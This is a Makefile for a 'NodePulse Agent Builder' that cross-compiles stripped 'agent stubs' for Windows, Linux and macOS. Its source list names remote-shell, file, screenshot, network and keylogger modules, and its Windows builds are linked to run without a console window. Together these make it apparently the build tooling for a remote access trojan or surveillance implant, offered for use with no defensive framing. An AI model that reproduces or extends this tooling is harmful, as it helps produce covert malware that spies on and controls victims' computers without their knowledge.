# NodePulse Agent Builder
# Cross-compiles agent stubs for all platforms

CC_LINUX = gcc
CC_LINUX_ARM = aarch64-linux-gnu-gcc
CC_WIN64 = x86_64-w64-mingw32-gcc
CC_WIN32 = i686-w64-mingw32-gcc

CFLAGS = -Os -fno-stack-protector -Wall -Wextra
CFLAGS_RELEASE = $(CFLAGS) -s -DNDEBUG -fvisibility=hidden

# Source files
SRCS = src/main.c src/config.c \
       src/modules/modules.c src/modules/mod_shell.c src/modules/mod_files.c \
       src/modules/mod_screenshot.c src/modules/mod_sysinfo.c \
       src/modules/mod_network.c src/modules/mod_keylogger.c

SRCS_WIN = src/platform/platform_win.c
SRCS_LINUX = src/platform/platform_linux.c
SRCS_DARWIN = src/platform/platform_darwin.c

# Libraries
LDFLAGS_WIN = -lws2_32 -lwinhttp -lgdi32 -luser32 -liphlpapi -ladvapi32
LDFLAGS_LINUX = -lpthread -lcurl -static
LDFLAGS_DARWIN = -framework CoreGraphics -framework Foundation

STUB_DIR = stubs

.PHONY: all clean windows linux darwin checksums

all: windows linux
	@echo ""
	@echo "✅ Build complete! Stubs ready in $(STUB_DIR)/"
	@ls -lh $(STUB_DIR)/

# Windows
windows: $(STUB_DIR)/windows_amd64.exe $(STUB_DIR)/windows_386.exe

$(STUB_DIR)/windows_amd64.exe: $(SRCS) $(SRCS_WIN)
	@mkdir -p $(STUB_DIR)
	@echo "🔨 Building Windows x64..."
	$(CC_WIN64) $(CFLAGS_RELEASE) -o $@ $(SRCS) $(SRCS_WIN) $(LDFLAGS_WIN) -Wl,--subsystem,windows
	@echo "   ✓ $@ ($(shell ls -lh $@ | awk '{print $$5}'))"

$(STUB_DIR)/windows_386.exe: $(SRCS) $(SRCS_WIN)
	@mkdir -p $(STUB_DIR)
	@echo "🔨 Building Windows x86..."
	$(CC_WIN32) $(CFLAGS_RELEASE) -o $@ $(SRCS) $(SRCS_WIN) $(LDFLAGS_WIN) -Wl,--subsystem,windows
	@echo "   ✓ $@ ($(shell ls -lh $@ | awk '{print $$5}'))"

# Linux
linux: $(STUB_DIR)/linux_amd64 $(STUB_DIR)/linux_arm64

$(STUB_DIR)/linux_amd64: $(SRCS) $(SRCS_LINUX)
	@mkdir -p $(STUB_DIR)
	@echo "🔨 Building Linux x64..."
	$(CC_LINUX) $(CFLAGS_RELEASE) -o $@ $(SRCS) $(SRCS_LINUX) $(LDFLAGS_LINUX) || \
	$(CC_LINUX) $(CFLAGS_RELEASE) -o $@ $(SRCS) $(SRCS_LINUX) -lpthread -lcurl
	@echo "   ✓ $@ ($(shell ls -lh $@ | awk '{print $$5}'))"

$(STUB_DIR)/linux_arm64: $(SRCS) $(SRCS_LINUX)
	@mkdir -p $(STUB_DIR)
	@echo "🔨 Building Linux ARM64..."
	$(CC_LINUX_ARM) $(CFLAGS_RELEASE) -o $@ $(SRCS) $(SRCS_LINUX) $(LDFLAGS_LINUX) 2>/dev/null || echo "   ⚠ ARM64 cross-compiler not found, skipping"

# macOS (requires native macOS or osxcross)
darwin: $(STUB_DIR)/darwin_amd64 $(STUB_DIR)/darwin_arm64

$(STUB_DIR)/darwin_amd64: $(SRCS) $(SRCS_DARWIN)
	@mkdir -p $(STUB_DIR)
	@echo "🔨 Building macOS x64..."
	clang $(CFLAGS_RELEASE) -target x86_64-apple-macos10.12 -o $@ $(SRCS) $(SRCS_DARWIN) $(LDFLAGS_DARWIN) 2>/dev/null || echo "   ⚠ macOS SDK not found, skipping"

$(STUB_DIR)/darwin_arm64: $(SRCS) $(SRCS_DARWIN)
	@mkdir -p $(STUB_DIR)
	@echo "🔨 Building macOS ARM64..."
	clang $(CFLAGS_RELEASE) -target arm64-apple-macos11 -o $@ $(SRCS) $(SRCS_DARWIN) $(LDFLAGS_DARWIN) 2>/dev/null || echo "   ⚠ macOS SDK not found, skipping"

checksums:
	@echo "=== SHA256 Checksums ==="
	@sha256sum $(STUB_DIR)/* 2>/dev/null || shasum -a 256 $(STUB_DIR)/*

clean:
	rm -rf $(STUB_DIR)
